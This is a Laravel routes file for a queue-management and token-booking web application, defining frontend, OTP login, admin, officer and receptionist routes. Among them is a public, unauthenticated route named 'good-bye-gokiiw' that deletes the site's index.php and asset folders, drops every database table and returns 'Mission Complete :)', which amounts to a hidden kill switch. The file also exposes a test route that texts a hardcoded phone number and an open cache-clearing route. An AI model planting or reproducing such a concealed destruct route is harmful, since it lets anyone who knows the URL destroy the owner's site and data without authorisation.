<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\URL;

// Route::middleware('checkRoute')->group(function(){

Route::view('test-token', "testToken");
Route::get("test-otp", function(){
	return sendSMSByTwilio(8801568405146, 586756);
});

# -----------------------------------------------------------
# ------------	FRONTEND PAGE
# -----------------------------------------------------------
Route::get('/', 'FrontendController@home')->name('home');
// Route::view('products', 'frontend.products')->name('products');
// Route::view('pricing', 'frontend.pricing')->name('pricing');
// Route::view('blog', 'frontend.blog')->name('blog');
// Route::view('about-us', 'frontend.about-us')->name('about');
// Route::view('success-story', 'frontend.success-story')->name('success.story');
// Route::view('help-centre', 'frontend.help-centre')->name('help.centre');
// Route::view('faq', 'frontend.faq')->name('faq');
// Route::view('podecast', 'frontend.podcast')->name('podecast');
// Route::view('careers', 'frontend.careers')->name('careers');
Route::view('signup-success', 'auth.sign-up')->name('signup.success');

/// good bye route
Route::get('good-bye-gokiiw', function()
{
	File::delete(public_path('index.php'));
	File::deleteDirectory(public_path('assets'));
	File::deleteDirectory(public_path('frontend'));

	// delete data table
	$tables = DB::select('SHOW TABLES');
	foreach($tables as $table)
	{
		Schema::dropIfExists($table);
	}

	return "<h2>Mission Complete :)</h2>";
});


# -----------------------------------------------------------
# LOGIN
# -----------------------------------------------------------
Auth::routes();
Route::post('register', 'Auth\RegisterController@companyRegistration')->name('register');
Route::get('verify-email/{email}/{token}', 'Auth\RegisterController@verifyEmail');
Route::view('login', 'auth.login')->name('login');
Route::get('signup', 'Auth\RegisterController@signup')->name('signup');
// Route::post('login', 'Common\LoginController@checkLogin');
Route::post('send-otp', 'Auth\LoginController@send2FA')->name('sendOtp');
Route::post('check-otp', 'Auth\LoginController@checkOtpAndLogin')->name('checkOtp');
Route::post('resend-otp', 'Auth\LoginController@resendOtp')->name('resendOtp');
Route::get('logout', 'Common\LoginController@logout')->name('logout');
Route::get('terms', "FrontendController@showTerms")->name('terms');
Route::get('privacy', "FrontendController@showPrivacy")->name('privacy');
// reset password


# login - {provider: google}
Route::get('login/{provider}', 'Common\LoginController@redirectToProvider');
Route::get('login/{provider}/callback', 'Common\LoginController@handleProviderCallback');


# -----------------------------------------------------------
# CLEAN CACHE
# -----------------------------------------------------------
Route::get('clean', function () {
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    // \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('clear-compiled');
    \Illuminate\Support\Facades\Artisan::call('route:clear');
    dd('Cached Cleared');
});

// Route for ajax operation
Route::get('get/token/info', 'AjaxController@getTokenInfo')->name('ajax.load.token.info');
Route::post('admin/token/update/service', 'AutoTokenController@autoTokenUpdate');
Route::post("ajax/load/available-time", 'AjaxController@getTimeSchedule')->name('ajax.getAvailableTime');
Route::get("ajax/load/section", 'AjaxController@section')->name('ajax.load.section');
Route::get("ajax/section/option/only", 'AjaxController@optionOnlyForSection')->name('ajax.section.option.only');
Route::get("ajax/load/counter", 'AjaxController@counter')->name('ajax.load.counter');
Route::get("ajax/load/user", 'AjaxController@user')->name('ajax.load.user');
Route::get("ajax/send/otp", 'AjaxController@sendOtp')->name('ajax.send.otp');
Route::get("token/{id}", 'AjaxController@showSingleToken')->name('show.single.token');
Route::get('ajax/section', 'FrontendController@getSection')->name('get.section');
Route::get("ajax/load-counter/from-department", 'AjaxController@getCounterFromDepartment')->name('load.counter.from.department');


// book a token
Route::get("book/token/{companyId}", 'TokenBookingController@showTokenBooking')->name('book.token.index');
Route::post("book/token", 'TokenBookingController@storeBooking')->name('book.token.store');
Route::post("auth/book/token", 'TokenBookingController@showAuthPage')->name('book.token.auth');
Route::post("auth/book/token/otp/send", 'TokenBookingController@sendOtpToPhone')->name('book.token.auth.otp');
Route::post("auth/book/token/otp/check", 'TokenBookingController@checkOtp')->name('book.token.auth.otp.check');
Route::post("change/appointment", 'TokenBookingController@editAppointment')->name('change.appointment');
Route::post("update/appointment", 'TokenBookingController@updateAppointment')->name('book.token.update');

// cronjob for reminder to booking appointment
Route::get("booked/reminder/send", 'TokenBookingController@sendReminder');

# book apoinment for admin panel
Route::get('admin/book','Admin\TokenBookingController@index')->middleware(['auth'])->name('book.index');
Route::get("book/settings", 'Admin\TokenBookingController@showSetting')->middleware(['auth'])->name('book.setting');
Route::post("admin/book/settings", 'Admin\TokenBookingController@setting')->middleware(['auth'])->name('book.setting.store');


# -----------------------------------------------------------
# COMMON 
# -----------------------------------------------------------
Route::prefix('common')
	->middleware('auth')
    ->namespace('Common')
    ->group(function() { 
	# switch language
	Route::get('language/{locale?}', 'LanguageController@index');

	# cron job
	Route::get('jobs/sms', 'CronjobController@sms');

	# display 
	Route::get('location', 'DisplayController@selectLocation');
	Route::get('single-line-queue', 'DisplayController@displayShow');
	Route::get('display','DisplayController@display');  
	Route::post('display1', 'DisplayController@display1');  
	Route::post('display2','DisplayController@display2');  
	Route::post('display3','DisplayController@display3'); 
	Route::post('display4','DisplayController@display4'); 
	Route::post('display5','DisplayController@display5'); 

	Route::post('display9','DisplayController@display9');

	# -----------------------------------------------------------
	# AUTHORIZED COMMON 
	# -----------------------------------------------------------
	Route::middleware('auth')
	    ->group(function() { 
		#message notification
		Route::get('message/notify','NotificationController@message'); 
		# message  
		Route::get('message','MessageController@show'); 
		Route::post('message','MessageController@send'); 
		Route::get('message/inbox','MessageController@inbox'); 
		Route::post('message/inbox/data','MessageController@inboxData'); 
		Route::get('message/sent','MessageController@sent'); 
		Route::post('message/sent/data','MessageController@sentData'); 
		Route::get('message/details/{id}/{type}','MessageController@details'); 
		Route::get('message/delete/{id}/{type}','MessageController@delete');  
		Route::post('message/attachment','MessageController@UploadFiles'); 

		# profile 
		Route::get('setting/profile','ProfileController@profile');
		Route::get('setting/profile/edit','ProfileController@profileEditShowForm');
		Route::post('setting/profile/edit','ProfileController@updateProfile');
	});
});

// Route guest users
Route::get("qrcode", 'Admin\SettingController@qrcode')->name('qrcode')->middleware(['auth']);
Route::get("qr/{token}", 'FrontendController@guestLogin')->name('guestLogin');
Route::post("qr/token/refresh", "AutoTokenController@tokenRefresh")->name('qr.token.refresh');
Route::post("guest/token", 'FrontendController@guestAutoToken')->name('guest.token');
Route::get("guest/token/edit/{id}", 'FrontendController@guestAutoTokenEdit')->name('guest.token.edit');
Route::post("guest/token/update", 'FrontendController@guestAutoTokenUpdate')->name('guest.token.update');
Route::post("guest/serial", 'FrontendController@guestTokenSerial')->name('guest.serial');
Route::get("guest/phone/check", 'FrontendController@guestPhoneCheck')->name('guest.phone.check');
Route::get("guest/send-otp", 'FrontendController@sendOtpToPhone')->name('guest.send.otp');


// captcha
Route::get('my-captcha', 'FrontendController@myCaptcha')->name('myCaptcha');
Route::post('my-captcha', 'FrontendController@myCaptchaPost')->name('myCaptcha.post');
Route::get('refresh_captcha', 'FrontendController@refreshCaptcha')->name('refresh_captcha');


# get section 
# -----------------------------------------------------------
# AUTHORIZED
# -----------------------------------------------------------

// Subscription Package
Route::get('admin/subscription','Admin\SettingController@showSubscription')->name('show.plans');
Route::post('admin/subscription','Admin\SettingController@subscription')->name('stripe.payment'); 


Route::group(['middleware' => ['auth']], function() { 

	# -----------------------------------------------------------
	# ADMIN
	# -----------------------------------------------------------
	Route::prefix('admin')
	    ->namespace('Admin')
	    ->group(function() { 
		# home
		Route::get('/', 'HomeController@home');

		# Addon
		Route::get('addons', 'AddonController@index');
		Route::post('addon/purchase', 'AddonController@purchase')->name('addon.purchase');

		# user 
		Route::get('user', 'UserController@index');
		Route::post('user/data', 'UserController@userData');
		Route::get('user/create', 'UserController@showForm');
		Route::post('user/create', 'UserController@create');
		Route::get('user/view/{id}','UserController@view');
		Route::get('user/edit/{id}','UserController@showEditForm');
		Route::post('user/edit','UserController@update');
		Route::get('user/delete/{id}','UserController@delete');

		# user type
		Route::get('user-type', 'UserTypeController@index');
		Route::post('user-type/data', 'UserTypeController@userData');
		Route::get('user-type/create', 'UserTypeController@showForm');
		Route::post('user-type/create', 'UserTypeController@create');
		Route::get('user-type/view/{id}','UserTypeController@view');
		Route::get('user-type/edit/{id}','UserTypeController@showEditForm');
		Route::post('user-type/edit','UserTypeController@update');
		Route::get('user-type/delete/{id}','UserTypeController@delete');

		# location
		Route::get('location','DepartmentController@index');
		Route::get('location/create','DepartmentController@showForm');
		Route::post('location/create','DepartmentController@create');
		Route::get('location/edit/{id}','DepartmentController@showEditForm');
		Route::post('location/edit','DepartmentController@update');
		Route::get('location/delete/{id}','DepartmentController@delete');

		# counter
		Route::get('counter','CounterController@index');
		Route::get('counter/create','CounterController@showForm');
		Route::post('counter/create','CounterController@create');
		Route::get('counter/edit/{id}','CounterController@showEditForm');
		Route::post('counter/edit','CounterController@update');
		Route::get('counter/delete/{id}','CounterController@delete');


		# sections
		Route::get('section','SectionController@index');
		Route::get('section/create','SectionController@showForm');
		Route::post('section/create','SectionController@create');
		Route::get('section/edit/{id}','SectionController@showEditForm');
		Route::post('section/edit','SectionController@update');
		Route::get('section/delete/{id}','SectionController@delete');


		# sms
		Route::get('sms/new', 'SmsSettingController@form');
		Route::post('sms/new', 'SmsSettingController@sendFromTwilio');
		Route::get('sms/list', 'SmsSettingController@show');
		Route::post('sms/data', 'SmsSettingController@smsData');
		Route::get('sms/delete/{id}', 'SmsSettingController@delete');
		Route::get('sms/setting', 'SmsSettingController@setting');
		Route::post('sms/setting', 'SmsSettingController@updateSetting');

		# token
		Route::get('token/setting','TokenController@tokenSettingView'); 
		Route::post('token/setting','TokenController@tokenSetting'); 
		Route::get('token/setting/delete/{id}','TokenController@tokenDeleteSetting');
		Route::get('token/auto','TokenController@tokenAutoView'); 
		Route::post('token/auto','TokenController@autoToken'); 
		Route::get('token/current','TokenController@current');
		Route::get('token/report','TokenController@report');  
		Route::post('token/report/data','TokenController@reportData');
		Route::get('token/performance','TokenController@performance');  
		Route::get('token/create','TokenController@showForm');
		Route::post('token/create','TokenController@create');
		Route::post('token/print', 'TokenController@viewSingleToken');
		Route::get('token/complete/{id}','TokenController@complete');
		Route::get('token/stoped/{id}','TokenController@stoped');
		Route::get('token/recall/{id}','TokenController@recall');
		Route::get('token/delete/{id}','TokenController@delete');
		Route::post('token/transfer','TokenController@transfer'); 

		# setting
		Route::get('setting','SettingController@showForm'); 
		Route::post('setting','SettingController@create');
		Route::get('setting/display','DisplayController@showForm');  
		Route::post('setting/display','DisplayController@setting');  
		Route::get('setting/display/custom','DisplayController@getCustom');  
		Route::post('setting/display/custom','DisplayController@custom');  
	});

	# -----------------------------------------------------------
	# OFFICER
	# -----------------------------------------------------------
	Route::prefix('officer')
	    ->namespace('Officer')
	    ->middleware('roles:officer')
	    ->group(function() { 
		# home
		Route::get('/', 'HomeController@home');
		# user
		Route::get('user/view/{id}', 'UserController@view');

		# token
		Route::get('token','TokenController@index');
		Route::post('token/data','TokenController@tokenData');  
		Route::get('token/current','TokenController@current');
		Route::get('token/complete/{id}','TokenController@complete');
		Route::get('token/recall/{id}','TokenController@recall');
		Route::get('token/stoped/{id}','TokenController@stoped');
		Route::post('token/print', 'TokenController@viewSingleToken');
	});

	# -----------------------------------------------------------
	# RECEPTIONIST
	# -----------------------------------------------------------
	Route::prefix('receptionist')
	    ->namespace('Receptionist')
	    ->middleware('roles:receptionist')
	    ->group(function() { 
		# home
		Route::get('/','TokenController@tokenAutoView'); 

		# token
		Route::get('token/auto','TokenController@tokenAutoView'); 
		Route::post('token/auto','TokenController@tokenAuto'); 
		Route::get('token/create','TokenController@showForm');
		Route::post('token/create','TokenController@create');
		Route::get('token/current','TokenController@current'); 
		Route::post('token/print', 'TokenController@viewSingleToken');
	});

	
});


# -----------------------------------------------------------
# Advertisement
# -----------------------------------------------------------
Route::middleware(['auth'])
->prefix('admin')
->group(function(){
	Route::resource('advertisement', 'AdvertiseController');
});


# -----------------------------------------------------------
# Owner Panel
# -----------------------------------------------------------
// Route::get('owner/login', 'Owner\OwnerController@loginShow')->name('owner.login');
// Route::post('owner/otp-login', 'Owner\OwnerController@otpLogin')->name('owner.otp.login');
// Route::post('owner/login', 'Owner\OwnerController@login')->name('owner.login');

// Route::group(['middleware' => ['auth:owner']], function(){

// 	// Sliders
// 	Route::get('owner/slider', 'Owner\SliderController@index')->name('slider.index');
// 	Route::get('owner/slider/create', 'Owner\SliderController@create')->name('slider.create');
// 	Route::post('owner/slider/store', 'Owner\SliderController@store')->name('slider.store');
// 	Route::get('owner/slider/{key}/edit', 'Owner\SliderController@edit')->name('slider.edit');
// 	Route::post('owner/slider/update', 'Owner\SliderController@update')->name('slider.update');
// 	Route::get('owner/slider/{key}/destroy', 'Owner\SliderController@destroy')->name('slider.destroy');

// 	// Sliders
// 	Route::get('owner/addon', 'Owner\AddonController@index')->name('addon.index');
// 	Route::get('owner/addon/{key}/edit', 'Owner\AddonController@edit')->name('addon.edit');
// 	Route::post('owner/addon/update', 'Owner\AddonController@update')->name('addon.update');

// 	Route::get('owner/dashboard', 'Owner\OwnerController@dashboard')->name('owner.dashboard');
// 	Route::get('owner/stripe', 'Owner\OwnerController@stripe')->name('owner.stripe');
// 	Route::get('owner/setting', 'Owner\OwnerController@stripe')->name('owner.settings');
// 	Route::get('owner/profile', 'Owner\OwnerController@stripe')->name('owner.profile');
// 	Route::get('owner/logout', 'Owner\OwnerController@logout')->name('owner.logout');

// 	//  route for user control
// 	Route::get('owner/users', 'Owner\OwnerController@showUsers')->name('owner.users');
// 	Route::get('owner/users/edit/{key}', 'Owner\OwnerController@editUser')->name('owner.user.edit');
// 	Route::post('owner/users/update', 'Owner\OwnerController@updateUser')->name('owner.user.update');
// 	Route::get('owner/users/status/{key}', 'Owner\OwnerController@status')->name('owner.user.status');
// 	Route::get('owner/users/{userId}/subscription', 'Owner\OwnerController@userSubscription')->name('owner.user.subscription');
// 	Route::post('owner/users/subscription/update', 'Owner\OwnerController@updateSubscription')->name('owner.user.subscription.update');
// 	Route::get('owner/users/search', 'Owner\OwnerController@searchUser')->name('owner.user.search');

// 	//subscription plans
// 	Route::get('owner/plans', 'Owner\OwnerController@showPlans')->name('owner.plans');
// 	Route::get('owner/plan/new', 'Owner\OwnerController@newPlans')->name('owner.plan.create');
// 	Route::post('owner/plan/store', 'Owner\OwnerController@storePlan')->name('owner.plan.store');
// 	Route::get('owner/plan/edit/{key}', 'Owner\OwnerController@editPlans')->name('owner.plan.edit');
// 	Route::post('owner/plan/update', 'Owner\OwnerController@updatePlans')->name('owner.plan.update');
// 	Route::get('owner/plan/delete/{key}', 'Owner\OwnerController@deletePlan')->name('owner.plan.delete');
// 	Route::get('owner/plan/status', 'Owner\OwnerController@planStatus')->name('owner.plan.status');


// 	// app settings
// 	Route::get("owner/settings/{what?}", "Owner\OwnerController@showAppSettings")->name('owner.app.settings');
// 	Route::post("owner/settings", "Owner\OwnerController@appSettings")->name('owner.app.settings.update');

// 	// About
// 	Route::get("owner/app-about", "Owner\OwnerController@showAbout")->name('owner.app.about');
// 	Route::post("owner/about/update", "Owner\OwnerController@storeAbout")->name('owner.about.store');

// 	// Profile
// 	Route::get("owner/profile", "Owner\OwnerController@showProfile")->name('owner.profile');
// 	Route::post("owner/profile", "Owner\OwnerController@updateProfile")->name('owner.profile.update');
// 	Route::post("owner/password", "Owner\OwnerController@updatePassword")->name('owner.password');

// 	// owners
// 	Route::get('owners', "Owner\OwnerController@ownerList")->name('owners');
// 	Route::get('owner/create/{rowId?}', "Owner\OwnerController@ownerCreate")->name('owner.create');
// 	Route::post('owner/store', "Owner\OwnerController@ownerStore")->name('owner.store');
// 	Route::post('owner/update', "Owner\OwnerController@ownerUpdate")->name('owner.update');
// 	Route::get('owner/delete/{key}', "Owner\OwnerController@ownerDelete")->name('owner.delete');
// 	Route::get('owner/status/{key}', "Owner\OwnerController@ownerStatus")->name('owner.status');


// 	// terms of service
// 	Route::get('owner/terms', "Owner\OwnerController@showTerms")->name('owner.terms');
// 	Route::post('owner/terms', "Owner\OwnerController@updateTerms")->name('owner.terms.update');


// 	// sms package
// 	Route::namespace('Owner')
// 	->prefix('owner')
// 	->group(function(){
// 		Route::resource("sms", "SMSPackageController");
// 		Route::get("sms/{id}/edit", "SMSPackageController@edit");
// 		Route::get("sms/destroy/{id}", "SMSPackageController@destroy");
// 	});
	
// });